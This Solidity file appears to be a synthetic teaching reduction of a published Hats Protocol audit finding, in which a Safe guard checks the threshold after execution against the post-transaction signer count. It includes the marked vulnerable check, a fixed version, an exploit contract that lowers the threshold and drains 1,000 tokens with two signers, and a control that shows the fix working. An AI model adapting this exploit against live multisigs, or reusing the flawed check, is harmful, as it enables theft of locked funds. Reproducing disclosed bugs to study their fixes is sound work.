// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Hats Protocol — HatsSignerGateBase.checkAfterExecution (Sherlock 2023-02-hats, H-9)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the post-exec threshold check compares safe.getThreshold() to
    _getCorrectThreshold(), which recounts the owners left AFTER the same
    transaction. removeOwner can drop the threshold from 3 to 2 and the check
    still passes. A later transfer signed by only those 2 signers then moves
    1,000 tokens. That transfer reverts while the threshold is still 3.
    The comparison is the check at HatsSignerGateBase.sol L517-L519
    (hats-zodiac @ 9455cc0957762f5dbbd8e62063d970199109b977).
    Listed signer addresses stand in for Safe signatures. The report's
    8 -> 7 example is the same comparison; this reduction uses 3 -> 2. */

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Safe {
    address internal constant SENTINEL = address(0x1);
    mapping(address => address) public owners;
    uint256 public ownerCount;
    uint256 internal threshold;
    address public guard;

    function init(address[] calldata initial, uint256 threshold_, address guard_) external {
        require(ownerCount == 0, "init");
        address prev = SENTINEL;
        for (uint256 i; i < initial.length; i++) {
            owners[prev] = initial[i];
            prev = initial[i];
        }
        owners[prev] = SENTINEL;
        ownerCount = initial.length;
        threshold = threshold_;
        guard = guard_;
    }

    function getThreshold() public view returns (uint256) {
        return threshold;
    }

    function getOwners() public view returns (address[] memory list) {
        list = new address[](ownerCount);
        address cur = owners[SENTINEL];
        for (uint256 i; i < ownerCount; i++) {
            list[i] = cur;
            cur = owners[cur];
        }
    }

    function removeOwner(address prev, address owner, uint256 newThreshold) external {
        require(msg.sender == address(this), "self");
        require(owners[prev] == owner, "prev");
        require(newThreshold > 0 && newThreshold <= ownerCount - 1, "threshold");
        owners[prev] = owners[owner];
        owners[owner] = address(0);
        unchecked {
            ownerCount -= 1;
        }
        threshold = newThreshold;
    }

    function execTransaction(address to, bytes calldata data, bytes calldata signatures) external returns (bool) {
        HatsSignerGate(guard).checkTransaction(signatures);
        (bool ok, bytes memory ret) = to.call(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
        HatsSignerGate(guard).checkAfterExecution(bytes32(0), true);
        return true;
    }
}

contract HatsSignerGate {
    error SignersCannotChangeThreshold();
    error NotCalledFromSafe();
    error InvalidSigners();

    Safe public safe;
    uint256 public minThreshold;
    uint256 public targetThreshold;
    uint256 public thresholdBefore;
    address public hatAdmin;
    mapping(address => bool) public wearsHat;

    constructor(Safe _safe, uint256 _min, uint256 _target) {
        safe = _safe;
        minThreshold = _min;
        targetThreshold = _target;
        hatAdmin = msg.sender;
    }

    function setSigner(address account, bool wears) external {
        require(msg.sender == hatAdmin, "hatAdmin");
        wearsHat[account] = wears;
    }

    function isValidSigner(address account) public view returns (bool) {
        return wearsHat[account];
    }

    function checkTransaction(bytes calldata signatures) external {
        if (msg.sender != address(safe)) revert NotCalledFromSafe();
        thresholdBefore = safe.getThreshold();
        uint256 validSigCount = _countListedSigners(signatures);
        if (validSigCount < safe.getThreshold() || validSigCount < minThreshold) {
            revert InvalidSigners();
        }
    }

    function checkAfterExecution(bytes32, bool) external virtual {
        if (msg.sender != address(safe)) revert NotCalledFromSafe();
        // @> VULN: compared to the post-tx signer count, so removeOwner can lower the threshold in this transaction
        if (safe.getThreshold() != _getCorrectThreshold()) {
            revert SignersCannotChangeThreshold();
        }
    }

    function _getCorrectThreshold() internal view returns (uint256 _threshold) {
        uint256 count = _countValidSigners(safe.getOwners());
        uint256 min = minThreshold;
        uint256 max = targetThreshold;
        if (count < min) _threshold = min;
        else if (count > max) _threshold = max;
        else _threshold = count;
    }

    function correctThreshold() external view returns (uint256) {
        return _getCorrectThreshold();
    }

    function _countValidSigners(address[] memory owners_) internal view returns (uint256 validSignerCount) {
        uint256 length = owners_.length;
        for (uint256 i; i < length;) {
            if (isValidSigner(owners_[i])) {
                unchecked {
                    ++validSignerCount;
                }
            }
            unchecked {
                ++i;
            }
        }
    }

    function _countListedSigners(bytes calldata signatures) internal view returns (uint256 validSigCount) {
        address[] memory listed = abi.decode(signatures, (address[]));
        for (uint256 i; i < listed.length; i++) {
            if (isValidSigner(listed[i])) {
                unchecked {
                    ++validSigCount;
                }
            }
        }
    }
}

/// Recommended fix: compare the post-tx threshold to the value saved before execution.
contract HatsSignerGateFixed is HatsSignerGate {
    constructor(Safe _safe, uint256 _min, uint256 _target) HatsSignerGate(_safe, _min, _target) {}

    function checkAfterExecution(bytes32, bool) external override {
        if (msg.sender != address(safe)) revert NotCalledFromSafe();
        if (safe.getThreshold() != thresholdBefore) revert SignersCannotChangeThreshold();
    }
}

abstract contract ThresholdScenario {
    address public constant A = 0x00000000000000000000000000000000000000A1;
    address public constant B = 0x00000000000000000000000000000000000000b2;
    address public constant C = 0x00000000000000000000000000000000000000C3;
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 public constant LOCKED = 1000 ether;
    uint256 public constant OLD_THRESHOLD = 3;

    Token public token;
    Safe public safe;
    HatsSignerGate public gate;

    function _wire(bool fixedGate) internal {
        token = new Token();
        safe = new Safe();
        if (fixedGate) {
            gate = new HatsSignerGateFixed(safe, 1, 3);
        } else {
            gate = new HatsSignerGate(safe, 1, 3);
        }
        address[] memory initial = new address[](3);
        initial[0] = A;
        initial[1] = B;
        initial[2] = C;
        safe.init(initial, OLD_THRESHOLD, address(gate));
        gate.setSigner(A, true);
        gate.setSigner(B, true);
        gate.setSigner(C, true);
    }

    function _sigs(uint256 n) internal pure returns (bytes memory) {
        address[] memory listed = new address[](n);
        listed[0] = A;
        if (n > 1) listed[1] = B;
        if (n > 2) listed[2] = C;
        return abi.encode(listed);
    }

    function _payout() internal view returns (bytes memory) {
        return abi.encodeWithSignature("transfer(address,uint256)", ATTACKER, LOCKED);
    }
}

contract Exploit is ThresholdScenario {
    constructor() {
        _wire(false);
    }

    function run() external {
        token.mint(address(safe), LOCKED);
        (bool early,) = address(safe).call(
            abi.encodeWithSignature("execTransaction(address,bytes,bytes)", address(token), _payout(), _sigs(2))
        );
        require(!early, "old threshold allowed the transfer");
        require(token.balanceOf(ATTACKER) == 0, "paid early");
        address[] memory owners_ = safe.getOwners();
        bytes memory drop = abi.encodeWithSignature(
            "removeOwner(address,address,uint256)", owners_[owners_.length - 2], owners_[owners_.length - 1], 2
        );
        safe.execTransaction(address(safe), drop, _sigs(3));
        require(safe.getThreshold() == 2, "threshold");
        require(safe.getThreshold() < OLD_THRESHOLD, "not lower");
        safe.execTransaction(address(token), _payout(), _sigs(2));
        require(token.balanceOf(ATTACKER) == LOCKED, "not paid");
        require(token.balanceOf(address(safe)) == 0, "safe");
        require(gate.correctThreshold() == 2, "post check");
    }
}

contract ControlExploit is ThresholdScenario {
    constructor() {
        _wire(true);
    }

    function run() external {
        token.mint(address(safe), LOCKED);
        address[] memory owners_ = safe.getOwners();
        bytes memory drop = abi.encodeWithSignature(
            "removeOwner(address,address,uint256)", owners_[owners_.length - 2], owners_[owners_.length - 1], 2
        );
        (bool changed,) = address(safe).call(
            abi.encodeWithSignature("execTransaction(address,bytes,bytes)", address(safe), drop, _sigs(3))
        );
        require(!changed, "threshold changed");
        require(safe.getThreshold() == OLD_THRESHOLD, "threshold moved");
        (bool shortPaid,) = address(safe).call(
            abi.encodeWithSignature("execTransaction(address,bytes,bytes)", address(token), _payout(), _sigs(2))
        );
        require(!shortPaid, "two signatures paid");
        require(token.balanceOf(address(safe)) == LOCKED, "drained");
        safe.execTransaction(address(token), _payout(), _sigs(3));
        require(token.balanceOf(ATTACKER) == LOCKED, "full threshold failed");
        require(safe.getThreshold() == OLD_THRESHOLD, "control changed threshold");
    }
}
